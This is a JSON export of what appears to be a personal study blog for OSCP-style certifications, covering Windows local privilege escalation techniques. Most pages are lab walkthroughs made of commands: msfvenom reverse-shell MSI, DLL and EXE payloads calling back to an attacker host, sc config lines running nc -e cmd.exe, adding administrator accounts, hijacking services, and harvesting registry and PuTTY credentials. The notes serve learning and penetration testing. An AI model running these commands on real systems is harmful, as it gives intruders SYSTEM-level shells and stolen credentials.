{"/":{"title":"Welcome To My Cybersecurity Blog","content":"\n## 0xmid00\nHello üëã and Welcome to my blog, where I document my journey in information security. Here you'll find my notes, insights, and experiences as I study for OSCP, eCPPT, and eJPT certifications. Follow along as I explore various topics in cybersecurity, share my findings, and grow in this exciting field.","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/":{"title":"","content":"","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/":{"title":"Checklist - Local Windows Privilege Escalation","content":"# Checklist - Local Windows Privilege Escalation\n\n##  Kernel Exploits\n- [ ] [[Kernel Exploits]]¬†-¬†`python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | le`\n\n***\n## Services\n -  `.\\winPEASany.exe quiet servicesinfo`\n   \n* [ ] [[Insecure Service Properties|Insecure Service Properties]] \n* [ ] [[Unquoted Service Paths]]\n* [ ] [[Services registry modify permissions]]\n* [ ] [[Services binaries weak permissions]]\n* [ ] [[PATH DLL Hijacking|PATH DLL Hijacking]]\n***\n##  Registry\n\n- [ ] [[Run at startup]]¬†-¬†`.\\winPEASany.exe quiet applicationsinfo`\n- [ ] [[AlwaysInstallElevated]]¬†-¬†`.\\winPEASany.exe quiet windowscreds`\n***\n## Passwords\n\n- [ ] [[Searching the Registry for Passwords]]¬†-¬†`.\\winPEASany.exe quiet filesinfo userinfo`","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/AlwaysInstallElevated":{"title":"","content":"MSI files are package files used to install applications.  \nThese files run with the permissions of the user trying to install  \nthem. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.\n\n**If**¬†these 2 registers are¬†**enabled**¬†(value is¬†**0x1**), then users of any privilege can¬†**install**¬†(execute)¬†`*.msi`¬†files as NT AUTHORITY\\**SYSTEM**.\n\n```bash\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n```\n\n1.Use winPEAS to see if both registry values are set:  \n`.\\winPEASany.exe quiet windowscreds`\n\n\u003e [+] Checking AlwaysInstallElevated(T1012)  \n\u003e [?]¬†[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)\n\n```\nAlwaysInstallElevated set to 1 in HKLM!\nAlwaysInstallElevated set to 1 in HKCU!\n```\n\n2.Alternatively, verify the values manually:  \n`reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`  \n`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`\n\n3.Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:  \n`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi`\n\n4.Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:  \n`msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi`\n\n### Metasploit payloads\n\n```bash\nmsfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format\nmsfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted\n```","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Insecure-Service-Properties":{"title":"","content":"Each service has an ACL which defines certain service-specific  \npermissions.  \nSome permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,  \nSERVICE_QUERY_STATUS).  \nSome may be useful (e.g. SERVICE_STOP, SERVICE_START).  \nSome are dangerous (e.g. SERVICE_CHANGE_CONFIG,  \nSERVICE_ALL_ACCESS)\n\nIf our user has permission to change the configuration of a  \nservice which runs with SYSTEM privileges, we can change  \nthe executable the service uses to one of our own.  \nPotential Rabbit Hole: If you can change a service  \nconfiguration but cannot stop/start the service, you may not  \nbe able to escalate privileges!\n\n1.Run winPEAS to check for service misconfigurations:  \n`.\\winPEASany.exe quiet servicesinfo`\n\n\u003e 2. Note that we can modify the ‚Äúdaclsvc‚Äù service.\n\u003e     \n\u003e     \u003e \u003e YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles\n\u003e     \n\n3.We can confirm this with accesschk.exe:  \n`.\\accesschk.exe /accepteula -uwcqv user daclsvc`\n\n4.Check the current configuration of the service:  \n`sc qc daclsvc`\n\n5.Check the current status of the service:  \n`sc query daclsvc`\n\nIn the scenario where the \"Authenticated users\" group possesses¬†**SERVICE_ALL_ACCESS**¬†on a service, modification of the service's executable binary is possible. To modify and execute¬†**sc**:\n\n6.Reconfigure the service to use our reverse shell executable:  \n`sc config daclsvc binpath= \"\\\"C:\\PrivEsc\\reverse.exe\\\"\"`  \nor:\n\n```bash\nsc config \u003cService_Name\u003e binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\"\nsc config \u003cService_Name\u003e binpath= \"net localgroup administrators username /add\"\nsc config \u003cService_Name\u003e binpath= \"cmd \\c C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n\nsc config SSDPSRV binpath= \"C:\\Documents and Settings\\PEPE\\meter443.exe\"\n```\n\n### Restart service\n\n```bash\nwmic service NAMEOFSERVICE call startservice\nnet stop [service name] \u0026\u0026 net start [service name]\n```\n\nPrivileges can be escalated through various permissions:\n\n- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.\n- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.\n- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.\n- **GENERIC_WRITE**: Inherits the ability to change service configurations.\n- **GENERIC_ALL**: Also inherits the ability to change service configurations.\n\nFor the detection and exploitation of this vulnerability, the¬†_exploit/windows/local/service_permissions_¬†can be utilized.","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Kernel-Exploits":{"title":"","content":"##  System Info\n### Version info enumeration\n\nCheck if the Windows version has any known vulnerability (check also the patches applied).\n\n```bash\nsysteminfo\n\nsysteminfo \u003e systeminfo.txt\n#Run wesng to find potential exploits:\npython wes.py systeminfo.txt -i 'Elevation\nof Privilege' --exploits-only | less\n\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" #Get only that information\nwmic qfe get Caption,Description,HotFixID,InstalledOn #Patches\nwmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture\n```\n\n```bash\n[System.Environment]::OSVersion.Version #Current OS version\nGet-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches\nGet-Hotfix -description \"Security update\" #List only \"Security Update\" patches\n```\n\n### Version Exploits\n\nThis¬†[site](https://msrc.microsoft.com/update-guide/vulnerability)¬†is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the¬†**massive attack surface**¬†that a Windows environment presents.\n\n**On the system**\n\n- _post/windows/gather/enum_patches_\n- _post/multi/recon/local_exploit_suggester_\n- [_watson_](https://github.com/rasta-mouse/Watson)\n- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)¬†_(Winpeas has watson embedded)_\n\n**Locally with system information**\n\n- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)\n- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)\n\n**Github repos of exploits:**\n\n- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)\n- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)\n- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/PATH-DLL-Hijacking":{"title":"","content":"If you have¬†**write permissions inside a folder present on PATH**¬†you could be able to hijack a DLL loaded by a process and¬†**escalate privileges**.\n\n1.Use winPEAS to enumerate non-Windows services:  \n`.\\winPEASany.exe quiet servicesinfo`\n\n\u003e 2.Note that the C:\\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:\n\u003e \n\u003e \u003e [+] Checking write permissions in PATH folders (DLL Hijacking)()\n\n`.\\accesschk.exe /accepteula -uvqc user dllsvc`\n\n3.The ‚Äúdllsvc‚Äù service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:  \n`sc qc dllsvc`\n\n4.Run Procmon64.exe with administrator privileges. Press  \nCtrl+L to open the Filter menu. Check permissions of all folders inside PATH:  \n5.Add a new filter on the Process Name matching  \ndllhijackservice.exe.  \n6.On the main screen, deselect registry activity and  \nnetwork activity.\n\n7.Start the service:  \n`\u003e net start dllsvc`\n\n8.Back in Procmon, note that a number of ‚ÄúNAME NOT  \nFOUND‚Äù errors appear, associated with the hijackme.dll file.\n\n9.At some point, Windows tries to find the file in the C:\\Temp  \ndirectory, which as we found earlier, is writable by our user.\n\n10.On Kali, generate a reverse shell DLL named hijackme.dll:  \n`# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll`\n\n11.Copy the DLL to the Windows VM and into the C:\\Temp directory. Start a istener on Kali and then stop/start the service to trigger the exploit:  \n`net stop dllsvc`  \n`net start dllsvc`\n\nalternatively search :\n\n```bash\nfor %%A in (\"%path:;=\";\"%\") do ( cmd.exe /c icacls \"%%~A\" 2\u003enul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\\\ everyone authenticated users todos %username%\" \u0026\u0026 echo. )\n```","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Run-at-startup":{"title":"","content":"Windows can be configured to run commands at startup,  \nwith elevated privileges.  \nThese ‚ÄúAutoRuns‚Äù are configured in the Registry.  \nIf you are able to write to an AutoRun executable, and are  \nable to restart the system (or wait for it to be restarted) you  \nmay be able to escalate privileges.\n\n1.Use winPEAS to check for writable AutoRun executables:  \n`.\\winPEASany.exe quiet applicationsinfo`\n\n\u003e [?] Check if you can modify other users AutoRuns binaries\n\u003e \n\u003e \u003e File: C:\\Program Files\\Autorun Program\\program.exe\n\u003e \u003e \n\u003e \u003e \u003e FilePerms: Everyone [AllAccess]\n\n2.Alternatively, we could manually enumerate the AutoRun executables:  \n`reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`  \nand then use accesschk.exe to verify the permissions on each one:  \n`.\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"`\n\n3.The ‚ÄúC:\\Program Files\\Autorun Program\\program.exe‚Äù AutoRun executable is writable by Everyone. Create a backup of the original:  \n`copy \"C:\\Program Files\\Autorun Program\\program.exe\" C:\\Temp`\n\n4.Copy our reverse shell executable to overwrite the AutoRun executable:  \n`copy /Y C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\"`\n\n5.Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the ‚Äúuser‚Äù account and log in as the ‚Äúadmin‚Äù account first.","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Searching-the-Registry-for-Passwords":{"title":"","content":"The following commands will search the registry for keys and  \nvalues that contain ‚Äúpassword‚Äù\n\n```bash\nREG QUERY HKLM /F \"password\" /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\nREG QUERY HKLM /F \"password\" /t REG_SZ /S /d\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /d\n```\n\nThis usually generates a lot of results, so often it is more fruitful to look in known locations.\n\n1.Use winPEAS to check common password locations:  \n`.\\winPEASany.exe quiet filesinfo userinfo`\n\n\u003e (the final checks will take a long time to complete)  \n\u003e [+] Putty Sessions()  \n\u003e SessionName: BWP123F42  \n\u003e ProxyPassword: password123  \n\u003e ProxyUsername: admin\n\n2.The results show both AutoLogon credentials and Putty  \nsession credentials for the admin user  \n(admin/password123).\n\n3.We can verify these manually:  \n`reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"`  \n`reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s`\n\n4.On Kali, we can use the winexe command to spawn a shell using these credentials:  \n`winexe -U 'admin%password123' //192.168.1.22 cmd.exe`\n\n### Tools that search for passwords\n\n[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)¬†**is a msf**¬†plugin I have created this plugin to¬†**automatically execute every metasploit POST module that searches for credentials**¬†inside the victim.  \n[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)¬†automatically search for all the files containing passwords mentioned in this page.  \n[**Lazagne**](https://github.com/AlessandroZ/LaZagne)¬†is another great tool to extract password from a system.\n\nThe tool¬†[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)¬†search for¬†**sessions**,¬†**usernames**¬†and¬†**passwords**¬†of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)\n\n```bash\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Thorough\nInvoke-SessionGopher -AllDomain -o\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss\n```\n","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Services-binaries-weak-permissions":{"title":"","content":"If the original service executable is modifiable by our  \nuser, we can simply replace it with our reverse shell  \nexecutable.  \nRemember to create a backup of the original executable  \nif you are exploiting this in a real system!\n\n1.Run winPEAS to check for service misconfigurations:  \n`.\\winPEASany.exe quiet servicesinfo`\n\n\u003e 2.Note that the ‚Äúfilepermsvc‚Äù service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:\n\u003e \n\u003e \u003e File Permissions: Everyone [AllAccess]\n\n`\u003e .\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"`\n\n3.Create a backup of the original service executable:  \n`copy \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" C:\\Temp`\n\n4.Copy the reverse shell executable to overwrite the service executable:  \n`copy /Y C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"`\n\n5.Start a listener on Kali, and then start the service to trigger the exploit:  \n`net start filepermsvc`\n\n**Check if you can modify the binary that is executed by a service**¬†or if you have¬†**write permissions on the folder**¬†where the binary is located ([**DLL Hijacking**](app://obsidian.md/dll-hijacking/))**.**  \nYou can get every binary that is executed by a service using¬†**wmic**¬†(not in system32) and check your permissions using¬†**icacls**:\n\n```bash\nfor /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a \u003e\u003e %temp%\\perm.txt\n\nfor /f eol^=^\"^ delims^=^\" %a in (%temp%\\perm.txt) do cmd.exe /c icacls \"%a\" 2\u003enul | findstr \"(M) (F) :\\\"\n```\n\nYou can also use¬†**sc**¬†and¬†**icacls**:\n\n```bash\nsc query state= all | findstr \"SERVICE_NAME:\" \u003e\u003e C:\\Temp\\Servicenames.txt\nFOR /F \"tokens=2 delims= \" %i in (C:\\Temp\\Servicenames.txt) DO @echo %i \u003e\u003e C:\\Temp\\services.txt\nFOR /F %i in (C:\\Temp\\services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" \u003e\u003e C:\\Temp\\path.txt\n```","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Services-registry-modify-permissions":{"title":"","content":"The Windows registry stores entries for each service.  \nSince registry entries can have ACLs, if the ACL is  \nmisconfigured, it may be possible to modify a service‚Äôs  \nconfiguration even if we cannot modify the service  \ndirectly.\n\n1.Run winPEAS to check for service misconfigurations:  \n`.\\winPEASany.exe quiet servicesinfo`\n\n\u003e 2.Note that the ‚Äúregsvc‚Äù service has a weak registry entry. We can confirm this with PowerShell:\n\u003e \n\u003e \u003e [+] Looking if you can modify any service registry()  \n\u003e \u003e [?] Check if you can modify the registry of a service HKLM\\system\\currentcontrolset\\e services\\regsvc (Interactiv[TakeOwnership])\n\n`PS\u003e Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\regsvc | Format-List`\n\n3.Alternatively accesschk.exe can be used to confirm:  \n`.\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc`\n\n4.Overwrite the ImagePath registry key to point to our reverse shell executable:  \n`reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f`\n\n5.Start a listener on Kali, and then start the service to trigger the exploit:  \n`\u003e net start regsvc`\n\nYou should check if you can modify any service registry.  \nYou can¬†**check**¬†your¬†**permissions**¬†over a service¬†**registry**¬†doing:\n\n```bash\nreg query hklm\\System\\CurrentControlSet\\Services /s /v imagepath #Get the binary paths of the services\n\n#Try to write every service with its current content (to check if you have write permissions)\nfor /f %a in ('reg query hklm\\system\\currentcontrolset\\services') do del %temp%\\reg.hiv 2\u003enul \u0026 reg save %a %temp%\\reg.hiv 2\u003enul \u0026\u0026 reg restore %a %temp%\\reg.hiv 2\u003enul \u0026\u0026 echo You can modify %a\n\nget-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i \"\u003cUsername\u003e Users Path Everyone\"\n```\n\nIt should be checked whether¬†**Authenticated Users**¬†or¬†**NT AUTHORITY\\INTERACTIVE**¬†possess¬†`FullControl`¬†permissions. If so, the binary executed by the service can be altered.\n\nTo change the Path of the binary executed:\n\n```bash\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\\u003cservice_name\u003e /v ImagePath /t REG_EXPAND_SZ /d C:\\path\\new\\binary /f\n```","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Unquoted-Service-Paths":{"title":"","content":"If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.\n\nFor example, for the path¬†_C:\\Program Files\\Some Folder\\Service.exe_¬†Windows will try to execute:\n\n```powershell\nC:\\Program.exe \nC:\\Program Files\\Some.exe \nC:\\Program Files\\Some Folder\\Service.exe\n```\n\n1.Run winPEAS to check for service misconfigurations:  \n`.\\winPEASany.exe quiet servicesinfo`\n\n\u003e 2. Note that the ‚Äúunquotedsvc‚Äù service has an unquoted path that  \n\u003e     also contains spaces:  \n\u003e     C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\n\u003e     \n\u003e     \u003e No quotes and Space detected\n\u003e     \n\n3.Confirm this using sc:  \n`sc qc unquotedsvc`\n\n4.Use accesschk.exe to check for write permissions:  \n`.\\accesschk.exe /accepteula -uwdq C:\\`  \n`.\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\\"`  \n`.\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\"`  \n5.Copy the reverse shell executable and rename it appropriately:  \n`copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"`\n\n6.Start a listener on Kali, and then start the service to trigger the exploit:  \n`net start unquotedsvc`\n\nList all unquoted service paths, excluding those belonging to built-in Windows services:\n\n```bash\nwmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\nwmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\system32\\\\\" |findstr /i /v \"\"\" #Not only auto services\n\n#Other way\nfor /f \"tokens=2\" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (\n\tfor /f \"delims=: tokens=1*\" %%r in ('sc qc \"%%~n\" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:\"c:\\windows\\system32\" ^| findstr /v /c:\"\"\"\"') do (\n\t\techo %%~s | findstr /r /c:\"[a-Z][ ][a-Z]\" \u003enul 2\u003e\u00261 \u0026\u0026 (echo %%n \u0026\u0026 echo %%~s \u0026\u0026 icacls %%s | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\\\ everyone authenticated users todos %username%\") \u0026\u0026 echo.\n\t)\n)\n```\n\n```bash\ngwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n```\n\n**You can detect and exploit**¬†this vulnerability with metasploit:¬†`exploit/windows/local/trusted\\_service\\_path`¬†You can manually create a service binary with metasploit:\n\n```bash\nmsfvenom -p windows/exec CMD=\"net localgroup administrators username /add\" -f exe-service -o service.exe\n```","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null},"/Windows/Windows-Privilege-Escalation/Untitled":{"title":"","content":"","lastmodified":"2024-08-04T19:48:11.727477289Z","tags":null}}